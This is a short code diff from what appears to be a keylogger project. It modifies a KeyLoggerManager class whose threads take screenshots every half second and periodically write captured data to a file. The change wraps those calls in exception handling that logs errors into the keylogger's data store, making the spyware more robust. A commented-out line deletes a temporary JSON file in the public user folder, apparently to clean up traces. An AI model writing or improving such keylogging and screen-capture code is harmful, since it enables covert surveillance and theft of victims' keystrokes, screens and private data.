@@ -24,12 +24,18 @@ class KeyLoggerManager:
 
     def __thread_take_shot(self):
         while self.__instance._KeyloggerService__action:
-            self.__instance._take_shot()
+            try:
+                self.__instance._take_shot()
+            except Exception as e:
+                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__db, e)
             time.sleep(0.5)
 
     def __write_file(self):
         while self.__instance._KeyloggerService__action:
-            self.write_file()
+            try:
+                self.write_file()
+            except Exception as e:
+                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__db, e)
             time.sleep(2)
         self.write_file()
         # os.remove(r"C:\Users\Public\tmp.json")
